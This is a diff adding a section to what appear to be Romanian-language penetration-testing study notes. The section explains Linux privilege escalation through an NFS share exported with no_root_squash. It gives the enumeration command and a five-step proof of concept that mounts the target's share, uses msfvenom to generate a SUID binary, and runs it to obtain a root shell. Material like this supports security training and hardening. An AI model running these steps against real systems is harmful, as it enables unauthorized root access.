@@ -511,5 +511,54 @@ Din motive de securitate, o cheie privată trebuie să fie protejată cu permisi
    ```
 
 
+---
+
+## 15. Privilege Escalation via NFS no_root_squash
+
+### Mecanism & Vulnerabilitate
+Serviciul **NFS (Network File System)** permite partajarea de directoare prin rețea. În mod implicit, NFS folosește o măsură de securitate numită **Root Squashing** (`root_squash`). Aceasta transformă automat orice fișier creat de utilizatorul `root` al unei mașini la distanță într-un fișier deținut de utilizatorul neprivilegiat `nobody` pe serverul local, prevenind atacurile.
+
+Vulnerabilitatea apare atunci când în fișierul de configurare `/etc/exports` este definită opțiunea **`no_root_squash`**. Această setare forțează serverul să aibă încredere oarbă în identitatea utilizatorului de la distanță. Dacă un atacator este `root` pe propria mașină de atac (ex: Kali), el poate crea și transfera în directorul partajat un binar căruia să îi aplice bitul SUID. Serverul va păstra proprietarul ca fiind `root` și va menține bitul SUID intact, creând un vector direct de Privilege Escalation pentru utilizatorii locali simpli.
+
+### Enumerare și Detectare
+Pe mașina țintă, se verifică fișierul de configurare al partajărilor NFS pentru a identifica directoarele care au protecția dezactivată:
+```bash
+cat /etc/exports
+```
+*Căutăm linii care conțin un director accesibil (cum ar fi `/tmp`) urmat de opțiunea `no_root_squash`.*
+
+### Etape de Exploatare (PoC)
+
+1. **Obținerea drepturilor de root local pe mașina de atac:**
+   Trecem în modul administrator pe mașina Kali pentru ca serverul de la distanță să ne recunoască drept `root`:
+   ```bash
+   sudo su
+   ```
+
+2. **Montarea directorului partajat:**
+   Creeăm un punct de montare local și mapăm folderul vulnerabil al victimei:
+   ```bash
+   mkdir /tmp/nfs
+   mount -o rw,vers=3 <IP_TINTA>:/tmp /tmp/nfs
+   ```
+
+3. **Generarea și injectarea binarului SUID:**
+   Folosim `msfvenom` pentru a genera un executabil ELF simplu care apelează `/bin/bash -p` și îl salvăm direct în folderul montat:
+   ```bash
+   msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
+   ```
+
+4. **Aplicarea permisiunilor SUID (Pasul Critic):**
+   Fiind `root` pe Kali, aplicăm bitul SUID pe fișier. Datorită `no_root_squash`, serverul țintă va salva fișierul pe disc ca fiind deținut de `root`:
+   ```bash
+   chmod +xs /tmp/nfs/shell.elf
+   ```
+
+5. **Execuția pe mașina țintă:**
+   Ne întoarcem în terminalul utilizatorului simplu de pe mașina vulnerabilă și rulăm binarul proaspăt generat în `/tmp` pentru a obține root shell-ul:
+   ```bash
+   /tmp/shell.elf
+   ```
+
 
 
